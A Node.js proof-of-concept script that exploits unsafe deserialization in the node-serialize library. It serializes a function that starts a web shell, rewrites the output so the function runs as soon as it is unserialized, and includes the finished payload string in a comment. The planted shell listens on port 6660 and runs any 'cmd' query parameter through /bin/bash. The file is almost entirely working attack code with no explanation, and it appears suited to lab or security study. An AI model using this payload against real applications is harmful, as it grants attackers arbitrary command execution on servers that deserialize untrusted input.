const serialize = require('node-serialize');

const webShell = function () {
  const sys = require('sys');
  const exec = require('child_process').exec;
  const http = require('http');
  const url = require('url');
      
  const child = function(res, cmd) {
    exec(
      cmd,
      {shell: '/bin/bash'},
      function (error, stdout, stderr) {
        res.end(stdout);
        if (error !== null) {
          console.log('exec error: ' + error);
        }
      });
  };

  http.createServer(function (req, res) {
    res.writeHead(200, {'Content-Type': 'text/plain'});

    let parsedRequest = url.parse(req.url, true);
    let cmd = parsedRequest.query['cmd'];
    if (cmd !== undefined) {
      console.log('[cmd] ' + cmd);
      child(res, cmd);
    }
  }).listen('6660', '127.0.0.1');
};

const input = { 'asdf': webShell };

let serialized = serialize.serialize(input);
serialized = serialized.replace(/\\n|/g, '');
serialized = serialized.substring(0, serialized.length - 2) + '()' + serialized.substring(serialized.length - 2);
// const serialized = `{"asdf":"_$$ND_FUNC$$_function () {  const sys = require('sys');  const exec = require('child_process').exec;  const http = require('http');  const url = require('url');        const child = function(res, cmd) {    exec(      cmd,      {shell: '/bin/bash'},      function (error, stdout, stderr) {        res.end(stdout);        if (error !== null) {          console.log('exec error: ' + error);        }      });  };  http.createServer(function (req, res) {    res.writeHead(200, {'Content-Type': 'text/plain'});    let parsedRequest = url.parse(req.url, true);    let cmd = parsedRequest.query['cmd'];    if (cmd !== undefined) {      console.log('[cmd] ' + cmd);      child(res, cmd);    }  }).listen('6660', '127.0.0.1');}()"}`;

const unserialized = serialize.unserialize(serialized);
